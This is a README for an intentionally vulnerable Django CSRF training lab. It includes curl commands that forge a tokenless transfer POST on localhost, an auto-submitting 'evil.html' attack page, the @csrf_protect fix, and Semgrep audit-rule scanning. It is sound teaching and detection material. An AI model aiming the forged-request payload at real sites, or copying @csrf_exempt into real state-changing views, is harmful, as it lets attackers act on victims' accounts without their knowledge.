# Lab 08 — Cross-Site Request Forgery (CSRF)

Companion lab for the blog post
**[Cross-Site Request Forgery (CSRF)](https://thiagoteixeira.tech/blog/)** (Series II).

| | |
|---|---|
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-352 — Cross-Site Request Forgery |
| **ASVS** | V4.2.2 — verify anti-CSRF defences on state-changing operations |
| **Detection** | SAST — the curated packs **miss** `@csrf_exempt`; Semgrep's own **audit-tier** rule catches it (no custom rule needed), asserted in CI (see Scanning it) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | `@csrf_exempt` transfer — a tokenless (forged) POST is accepted |
| Secure | [`views_secure.py`](views_secure.py) | `@csrf_protect` transfer — a POST without a valid token gets `403` |

Both move the logged-in user's `holdings` to a named recipient. The flag is
seeded into **alice's** account (the victim); a forged, tokenless POST transfers
it to **bob** (the attacker). A successful forgery is visible in the database —
the flag *moves* — not merely in a status code.

**A note on this repo's CSRF wiring.** In a default Django project
`CsrfViewMiddleware` is global and every view is protected; the vulnerability is
`@csrf_exempt` *removing* it. To keep the other command-line labs token-free,
this repo runs **without** the global middleware, so here the secure view opts
into protection with `@csrf_protect` and the vulnerable view's `@csrf_exempt` is
the *named* pattern (illustrative — the view is unprotected either way). The
security lesson is identical: a token the attacker cannot forge.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

The seed creates `alice` (victim, holds the flag) and `bob` (attacker, empty).
On Windows PowerShell, `curl` is an alias for `Invoke-WebRequest` — use
`curl.exe`, or Git Bash.

## Test the pair from the command line

A tokenless POST carrying the victim's session cookie is exactly the shape a
cross-site forgery produces — so `curl` reproduces the server side directly.

**1. Log in as `alice` (the victim)** and confirm she holds the flag:

```bash
curl -s -c jar.txt -d 'username=alice&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jar.txt http://127.0.0.1:8000/csrf/account/ | grep -o 'FLAG{[^}]*}'
# FLAG{csrf_via_csrf_exempt_state_change}
```

**2. Forge the transfer** — a tokenless POST to the vulnerable view moves her
flag to `bob`:

```bash
curl -s -b jar.txt -d 'to_account=bob' http://127.0.0.1:8000/csrf/vulnerable/transfer/
# ... moved FLAG{...} from alice to bob
```

**3. The attacker collects it** — log in as `bob` and read his account:

```bash
curl -s -c jarb.txt -d 'username=bob&password=labpass' http://127.0.0.1:8000/accounts/login/
curl -s -b jarb.txt http://127.0.0.1:8000/csrf/account/ | grep -o 'FLAG{[^}]*}'
# FLAG{csrf_via_csrf_exempt_state_change}   ← captured
```

**4. The fix** — the same tokenless POST against the secure view is rejected:

```bash
curl -s -b jar.txt -o /dev/null -w '%{http_code}\n' -d 'to_account=bob' http://127.0.0.1:8000/csrf/secure/transfer/
# 403
```

Or prove all of it in one command (from the repo root):

```bash
docker compose run --rm web python manage.py test labs.post_08_csrf
```

## The browser walkthrough (the real cross-site demo)

`curl` shows the server side; to see the *cross-site* mechanic, save this as
`evil.html` anywhere and open it in a browser where you are logged in as `alice`
at `127.0.0.1:8000`:

```html
<!-- evil.html — the attacker's auto-submitting page -->
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://127.0.0.1:8000/csrf/vulnerable/transfer/" method="POST">
    <input type="hidden" name="to_account" value="bob">
  </form>
</body>
```

The page submits on load; the browser attaches alice's session cookie
automatically; the vulnerable endpoint accepts it and the flag moves — the victim
sees nothing. Point the same form at `/csrf/secure/transfer/` and it gets a `403`.

> **SameSite caveat (read this).** Django's `sessionid`/`csrftoken` cookies
> default to `SameSite=Lax`, so a modern browser may **not** attach them to this
> cross-site POST at all — the browser can block the forgery *before* Django's
> token check would. That is defence in depth, not a lab defect: "your browser
> may block this before Django does." The server-side lesson (the secure view
> rejects the tokenless POST with `403`) holds regardless, which is why `tests.py`
> uses `Client(enforce_csrf_checks=True)` to prove it deterministically.

## The fix

Leave `CsrfViewMiddleware` in place (it is on by default in real projects); put
`{% csrf_token %}` in every POST form; never `@csrf_exempt` a state-changing
view; never perform state changes on GET. Here the secure view demonstrates the
enforcement explicitly:

```python
from django.views.decorators.csrf import csrf_protect

@csrf_protect      # a POST without a valid token gets 403
def transfer(request):
    ...
```

## Isolation

This lab teaches CSRF and nothing else. The recipient is validated and must
differ from the sender, so it does not drift into IDOR (Post 6); no raw SQL;
output escaped. Global CSRF is deliberately off in this repo (see the note
above), which is why the contrast is drawn with `@csrf_protect`.

## Scanning it

The standard SAST tools an analyst runs by default **miss** this. Bandit has no
`@csrf_exempt` check (only a `B106` false alarm on the test password). Semgrep's
curated packs (`p/django`, `p/python`, `p/owasp-top-ten`) report **0 on both
views** — but the rule *exists*, in the **audit tier** the curated packs exclude:

```bash
# curated packs — miss it
bandit -r labs/post_08_csrf/
semgrep scan --config p/django --config p/python --config p/owasp-top-ten labs/post_08_csrf/

# Semgrep's own audit-tier rule — catches it, and distinguishes the pair
semgrep scan --config r/python.django.security.audit.csrf-exempt labs/post_08_csrf/views_vulnerable.py  # 1 finding (@csrf_exempt)
semgrep scan --config r/python.django.security.audit.csrf-exempt labs/post_08_csrf/views_secure.py      # 0 findings (@csrf_protect)
```

So there is **no custom rule** here — Semgrep already ships one
(`python.django.security.audit.csrf-exempt.no-csrf-exempt`); the lesson is
**audit-tier awareness**: security-relevant rules can sit in a tier a default
scan skips. CI asserts that audit rule fires on the vulnerable view and is silent
on the secure one. The captured runs are under [`scans/`](scans/); full reasoning
(including the DAST/SameSite note) is in [`scans/README.md`](scans/README.md).

Bandit and Semgrep are pinned but **not bundled in the lab image** (same as CI).
Install them on the host — `pip install bandit==1.9.4 semgrep==1.170.0` — or
prefix a command with `docker compose run --rm web sh -c "..."`. All commands run
from the repository root.
